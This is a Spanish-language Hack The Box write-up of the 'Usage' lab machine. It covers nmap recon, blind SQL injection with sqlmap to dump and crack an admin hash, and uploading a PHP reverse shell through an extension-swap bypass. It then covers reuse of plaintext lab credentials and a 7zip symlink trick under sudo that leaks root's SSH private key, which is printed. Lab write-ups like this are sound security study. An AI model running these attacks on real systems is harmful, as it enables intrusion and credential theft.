---
title: Usage
description:  Usage es una máquina Linux fácil de manejar que presenta un sitio de blog vulnerable a inyecciones SQL, lo que permite extraer y descifrar la contraseña cifrada del administrador. Esto lleva al acceso al panel de administración, donde se explota un módulo desactualizado de Laravel para subir un web shell PHP y obtener ejecución remota de código. En la máquina, las credenciales en texto plano almacenadas en un archivo permiten el acceso SSH como otro usuario, quien puede ejecutar un binario personalizado como root. La herramienta realiza una llamada insegura a 7zip, lo que se aprovecha para leer la clave SSH privada del usuario root y comprometer completamente el sistema.
date: 2024-06-07
toc: true
pin: false
image:
 path: /assets/img/htb-writeup-usage/usage_logo.png
categories:
  - Hack_The_Box
  - Machines
tags:
  - linux
  - hack_the_box
  - fuzzing_web
  - sqli
  - sqli_blind
  - cve
  - data_leaks
  - password_attacks
  - ssh
  - http
  - tcp
  - symlink_abuse
  - sudo_abuse
  - php
  - information_gathering
  - web_analysis
  - vulnerability_exploitation
  - cve_exploitation
  - privilege_escalation


---
## Information Gathering

```terminal
/home/kali/Documents/htb/machines/usage:-$ sudo nmap -sS -sC -sV 10.10.11.18 
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 a0:f8:fd:d3:04:b8:07:a0:63:dd:37:df:d7:ee:ca:78 (ECDSA)
|_  256 bd:22:f5:28:77:27:fb:65:ba:f6:fd:2f:10:c7:82:8f (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://usage.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![](/assets/img/htb-writeup-usage/usage1_1.png)

```terminal
/home/kali/Documents/htb/machines/usage:-$ echo '10.10.11.18\tusage.htb\tadmin.usage.htb' > sudo tee -a /etc/hosts
```
```terminal
/home/kali/Documents/htb/machines/usage:-$ dirb http://usage.htb/ /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt

+ http://usage.htb/login (CODE:200|SIZE:5141)
+ http://usage.htb/registration (CODE:200|SIZE:5112)
+ http://usage.htb/logout (CODE:302|SIZE:334)
```
---
## Web Analysis & Vulnerability Exploitation

![](/assets/img/htb-writeup-usage/usage1_2.png)
![](/assets/img/htb-writeup-usage/usage1_3.png)
![](/assets/img/htb-writeup-usage/usage2.png)

Luego de unas pruebas, encuentro que la direccion `/forget-password` es vulnerable a SQL injection Blind.

![](/assets/img/htb-writeup-usage/usage3_1.png)

Utilizo Sqlmap para enumerar la base de datos.

```terminal
/home/kali/Documents/htb/machines/usage:-$ sudo sqlmap -r request.txt -p email --level 5 --risk 3 --threads 10 -D database_name --tables
```
![](/assets/img/htb-writeup-usage/usage3_2.png)

Y logro encontrar un hash que le pertenece al usuario `administrator`.

```terminal
/home/kali/Documents/htb/machines/usage:-$ sudo sqlmap -r request4.txt  -p email --dbms=mysql --level=3 --risk=3 --technique=BUT -v 7 --batch -D usage_blog -T admin_users --dump --threads 3
[INFO] retrieved: admin
[DEBUG] performed 40 queries in 67.10 seconds
[DEBUG] analyzing table dump for possible password hashes
Database: usage_blog
Table: admin_users
[1 entry]
+--------------------------------------------------------------+----------
| id | name   | avatar  | password   | username | created_at     | updated_at   | remember_token      

|1|Administrator|<blank>|$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2|admin|2023-08-13 02:48:26|2024-05-30 22:06:55|kThXIKu7GhLpgwStz7fCFxjDomCYS1SmPpxwEkzv1Sdzva0qLYaDhllwrsLT|
+--------------------------------------------------------------+----------
```

```terminal
/home/kali/Documents/htb/machines/usage:-$ echo '$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2' > hash

/home/kali/Documents/htb/machines/usage:-$ hashcat --show hash
3200  | bcrypt $2*$, Blowfish (Unix)                    | Operating System

/home/kali/Documents/htb/machines/usage:-$ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1
```

Consigo logearme como `administrador`. 

---
## CVE Exploitation

Analizando la pagina encuentro que la version de laravel es vulnerable, [CVE-2023-24249](https://nvd.nist.gov/vuln/detail/CVE-2023-24249).

Por tanto puedo insertar una reverse shell.

<https://pentestmonkey.net/tools/web-shells/php-reverse-shell>

![](/assets/img/htb-writeup-usage/usage4.png)

Solo permite subir un archivo de imagen a la web. Por lo que los pasos a seguir, son:

* Cambiar la extencion de la reverse shell de `.php` a `.jpg`.

* Me pongo a la escucha con Netcat por dos puertos distintos (la conexion por la shell no durara mucho tiempo, por lo que tengo que establecer otra conexion por un puerto distinto).

* Subo la shell e intercepto la peticion `POST` con Burp Suite, para cambiar manualmente la extenccion a `.php`.

* Devuelvo la peticion manipulada y navego donde esta alojada la shell `http://admin.usage.htb/uploads/img/injection.php` para ejecutarla.

* Finalmente recibo la conexion por el puerto 1234 y rapidamente creo una nueva conexion mas estable por el puerto 4444.

```terminal
/home/kali/Documents/htb/machines/usage:-$ mv injection.php injection.jpg
/home/kali/Documents/htb/machines/usage:-$ nc -lnvp 1234
/home/kali/Documents/htb/machines/usage:-$ nc -lnvp 4444
```

![](/assets/img/htb-writeup-usage/usage4_3.png)
![](/assets/img/htb-writeup-usage/usage4_4.png)

```terminal
dash@usage:~$ cat user.txt
```

---
## Privilege Escalation

![](/assets/img/htb-writeup-usage/usage5.png)

En el archivo `.monitrc` encuentro credenciales para el usuario `xander`

```terminal
dash@usage:~$ cat .monitrc
	Enable Web Access
	set httpd port 2812
     use address 127.0.0.1
     allow admin:3nc0d3d_pa$$w0rd

/home/kali/Documents/htb/machines/usage:-$ ssh xander@10.10.11.18
xander@10.10.11.18's password: 3nc0d3d_pa$$w0rd
```
El usario `xander` puede ejecutar el comando `/usr/bin/usage_management` como sudo.

```terminal
xander@usage:~$ sudo -l
```

![](/assets/img/htb-writeup-usage/usage6.png)

```terminal
xander@usage:~$ sudo /usr/bin/usage_management
	Choose an option:
	1. Project Backup
	2. Backup MySQL data
	3. Reset admin password
	Enter your choice (1/2/3): 1
```
Me muevo al directorio `/var/www/html` y creo un archivo vacio llamado `@id_rsa`

```terminal
xander@usage:/var/www/html$ touch @id_rsa
```
Con `id_rsa` creo un enlace simbólico en el directorio actual que apunta al archivo `/root/.ssh/id_rsa`. Esto significa que cualquier acceso al archivo `id_rsa` en `/var/www/html` se redirige al archivo real ubicado en `/root/.ssh/id_rsa`.

```terminal
xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
xander@usage:/var/www/html$ sudo /usr/bin/usage_management
```

![](/assets/img/htb-writeup-usage/usage8.png)

```terminal
kali/home/kali/Documents/htb/machines/usage:-$ nano id_rsa
	-----BEGIN OPENSSH PRIVATE KEY-----
	b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
	QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi
	QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q
	AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs
	H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
	-----END OPENSSH PRIVATE KEY-----
	
kali/home/kali/Documents/htb/machines/usage:-$ chmod 600 id_rsa
```
```terminal
kali/home/kali/Documents/htb/machines/usage:-$ ssh -i id_rsa root@10.10.11.18
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)

root@usage:~# cat /root/root.txt
```

> <a href="https://www.hackthebox.com/achievement/machine/1521382/597" target="_blank">Usage Machine from Hack The Box has been Pwned</a>
{: .prompt-tip }